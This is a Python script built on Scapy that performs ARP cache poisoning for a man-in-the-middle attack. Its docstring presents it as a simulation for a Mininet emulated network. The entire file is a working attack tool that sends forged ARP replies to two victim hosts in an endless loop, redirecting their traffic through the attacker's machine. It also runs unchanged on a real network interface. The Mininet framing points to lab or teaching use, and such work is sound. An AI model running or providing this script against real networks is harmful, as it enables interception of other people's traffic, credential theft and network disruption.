"""
ARP Poison Attack Script
=========================
Simulates a MITM attack by sending fake ARP replies
to poison the ARP cache of two victims.

Usage (run inside Mininet CLI on the attacker host):
  attacker> python3 arp_attack.py --attacker 10.0.0.4 --victim1 10.0.0.2 --victim2 10.0.0.3

Or from outside Mininet:
  sudo python3 arp_attack.py --attacker 10.0.0.4 --victim1 10.0.0.2 --victim2 10.0.0.3 --iface h3-eth0
"""

import argparse
import time
from scapy.all import ARP, Ether, sendp, get_if_hwaddr

def get_args():
    p = argparse.ArgumentParser()
    p.add_argument('--attacker', required=True, help='Attacker IP')
    p.add_argument('--victim1',  required=True, help='Victim 1 IP (e.g. host to intercept)')
    p.add_argument('--victim2',  required=True, help='Victim 2 IP (e.g. gateway)')
    p.add_argument('--iface',    default='eth0', help='Network interface to send on')
    p.add_argument('--interval', type=float, default=1.5, help='Seconds between poison bursts')
    p.add_argument('--count',    type=int,   default=0,   help='Number of bursts (0 = infinite)')
    return p.parse_args()


def poison(attacker_ip, victim_ip, target_ip, iface, attacker_mac):
    """
    Send a fake ARP reply to victim_ip claiming we are target_ip.
    This poisons victim's ARP cache: target_ip -> attacker_mac
    """
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(
        op=2,                   # ARP reply
        pdst=victim_ip,         # tell this host...
        psrc=target_ip,         # ...that this IP...
        hwsrc=attacker_mac,     # ...belongs to attacker's MAC
        hwdst='ff:ff:ff:ff:ff:ff'
    )
    sendp(pkt, iface=iface, verbose=False)


def main():
    args = get_args()

    try:
        attacker_mac = get_if_hwaddr(args.iface)
    except Exception as e:
        print(f'[!] Could not get MAC for {args.iface}: {e}')
        print('[!] Try specifying --iface (e.g. h3-eth0)')
        return

    print(f'[*] ARP Poison Attack')
    print(f'    Attacker : {args.attacker} ({attacker_mac}) on {args.iface}')
    print(f'    Victim 1 : {args.victim1}')
    print(f'    Victim 2 : {args.victim2}')
    print(f'    Interval : {args.interval}s')
    print(f'[*] Starting... Ctrl+C to stop\n')

    burst = 0
    try:
        while True:
            # Tell victim1 that victim2's IP belongs to attacker
            poison(args.attacker, args.victim1, args.victim2, args.iface, attacker_mac)
            # Tell victim2 that victim1's IP belongs to attacker
            poison(args.attacker, args.victim2, args.victim1, args.iface, attacker_mac)

            burst += 1
            print(f'[burst {burst}] Poisoned {args.victim1} and {args.victim2}')

            if args.count > 0 and burst >= args.count:
                break

            time.sleep(args.interval)

    except KeyboardInterrupt:
        print('\n[*] Stopped.')


if __name__ == '__main__':
    main()